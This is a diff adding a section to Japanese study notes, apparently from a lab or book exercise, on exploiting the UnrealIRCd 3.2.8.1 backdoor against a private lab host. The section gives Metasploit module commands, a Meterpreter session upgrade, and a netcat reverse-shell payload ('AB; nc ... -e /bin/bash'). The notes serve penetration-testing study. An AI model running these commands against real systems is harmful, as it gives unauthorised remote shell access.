@@ -300,3 +300,45 @@ get authorized_keys
 
 # ファイラーで "smb://10.0.0.5/tmp" で同様にアクセス可
 ```
+
+### Unreal IRCバックドア
+
+```bash
+sudo apt install hexchat
+
+msfconsole
+search unrealirc
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set RHOSTS 10.0.0.5
+show payloads
+set payload cmd/unix/bind_perl # （書籍には書いていない）
+run
+# Ctrl+zでバックグランドへ
+
+# Meterpreterへ切り替える
+use post/multi/manage/shell_to_meterpreter
+set SESSION 1
+run
+
+sessions
+sessions -i 2
+# Ctrl+zでバックグランドへ
+
+sessions -k 1
+```
+
+```bash
+# Netcatで上記処理を再現
+
+# ターミナルA
+# 4444で待ち状態
+nc -lvp 4444
+
+# ターミナルB
+# IRCにアクセス
+nc 10.0.0.5 6667
+# バックドア用のAB
+AB; nc 10.0.0.1 4444 -e /bin/bash
+
+# これでターミナルA側でshell操作可能
+```
